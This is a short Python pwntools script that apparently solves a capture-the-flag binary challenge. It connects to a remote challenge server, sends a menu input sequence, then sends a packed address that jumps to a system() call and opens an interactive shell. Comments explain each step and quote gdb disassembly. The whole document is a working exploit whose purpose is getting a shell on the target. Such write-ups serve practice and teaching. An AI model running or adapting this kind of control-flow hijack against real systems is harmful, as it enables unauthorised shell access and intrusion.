from pwn import *
#running the game
# sh = process('FILE_DIRECTORY')
sh = remote('chal.hackmac.xyz', '30001')
#sending 1 for 4 times
[sh.sendline('1') for i in range(4)]
#sending the sequence 3-3-2 for 4 times
[sh.sendline('3\n3\n2') for i in range(4)]
#sending the address of the system call function as the input, p32 convert the address to packed binary data string that computer can understand
#    0x08048e09 <+112>:   sub    $0xc,%esp
#    0x08048e0c <+115>:   lea    -0x19b1(%ebx),%eax
# --Type <RET> for more, q to quit, c to continue without paging--
#    0x08048e12 <+121>:   push   %eax
#    0x08048e13 <+122>:   call   0x80484a0 <system@plt>
sh.sendline(p32(0x08048d39))
#interact with the system once get a shell
sh.interactive()
